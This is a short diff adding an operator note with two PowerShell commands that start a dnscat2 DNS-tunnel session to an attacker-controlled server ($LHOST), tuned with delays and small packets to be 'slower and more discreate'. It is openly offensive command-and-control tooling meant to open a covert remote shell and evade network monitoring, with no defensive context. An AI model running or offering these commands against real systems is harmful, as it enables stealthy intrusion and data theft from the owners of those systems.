@@ -1,0 +1,11 @@
+ 
+NOTE: Below are the commands to input into PS for a slower and more discreate session
+ 
+  SLOW
+  
+  Start-Dnscat2 -Domain Stal -DNSServer $LHOST -LookupTypes @("A","AAAA") -Delay 500 MaxRandomDelay 500 -MaxPacketSize 150 -PreSharedSecret <SOMEPASSWORD>
+  
+  VERY SLOW
+
+  Start-Dnscat2 -Domain Stal -DNSServer $LHOST -LookupTypes @("A","AAAA") -Delay 500 MaxRandomDelay 500 -MaxPacketSize 50 -PreSharedSecret <SOMEPASSWORD>
+
